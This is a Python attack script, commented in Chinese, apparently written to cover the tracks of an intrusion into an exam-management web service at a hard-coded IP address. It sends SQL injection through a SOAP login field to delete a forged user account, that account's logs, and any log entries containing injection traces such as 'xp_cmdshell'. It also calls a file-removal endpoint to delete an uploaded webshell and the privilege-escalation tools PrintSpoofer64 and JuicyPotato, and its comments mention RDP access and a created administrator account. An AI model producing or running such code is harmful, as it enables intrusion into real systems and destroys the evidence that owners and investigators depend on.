import requests

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

# 需要清理的物理文件 (FullPath)
# 注意：这些文件是你刚才上传的工具
FILES_TO_REMOVE = [
    # 3711 的 WebShell
    r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\s_3711.aspx",
    # 3711 上传的提权工具
    r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\PrintSpoofer64.exe",
    r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\JuicyPotato.exe"
]

def send_sql(desc, sql):
    print(f"[*] SQL执行: {desc}")
    injection = f"admin'; {sql}; --"
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        requests.post(TARGET_URL, data=soap.encode('utf-8'), headers=HEADERS, timeout=5)
    except:
        pass

def remove_file(path):
    print(f"[*] 删除物理文件: {path}")
    safe_path = path.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <RemoveFile xmlns="http://tempuri.org/">
          <path>{safe_path}</path>
        </RemoveFile>
      </soap:Body>
    </soap:Envelope>"""

    try:
        requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=HEADERS, timeout=5)
    except Exception as e:
        print(f"    [!] 异常: {e}")

def clean_trace_3711():
    print("=== 最终痕迹清理 (ID 3711) ===")

    # 1. 物理文件删除
    # 虽然你有了 RDP，但用脚本删一下更快捷
    print("\n[Step 1] 清理物理文件")
    for f in FILES_TO_REMOVE:
        remove_file(f)

    # 2. 数据库痕迹清理
    print("\n[Step 2] 清理数据库记录")
    # 删除我们伪造的 3711 用户
    send_sql("删除用户 3711 (Exam2020Stu)", "DELETE FROM Exam2020Stu WHERE ID=3711")
    # 删除 3711 的操作日志
    send_sql("删除日志 3711 (Exam2020Log)", "DELETE FROM Exam2020Log WHERE UID=3711")

    # 可选：清理包含攻击特征的日志 (admin, xp_cmdshell 等)
    print("\n[Step 3] 抹除攻击特征日志")
    sql_clean_logs = "DELETE FROM Exam2020Log WHERE What LIKE '%admin%' OR What LIKE '%xp_cmdshell%'"
    send_sql("删除包含注入特征的日志", sql_clean_logs)

    print("\n[Done] 清理完成。请手动断开 RDP 并删除刚创建的管理员账户(如果不再需要)。")

if __name__ == "__main__":
    clean_trace_3711()
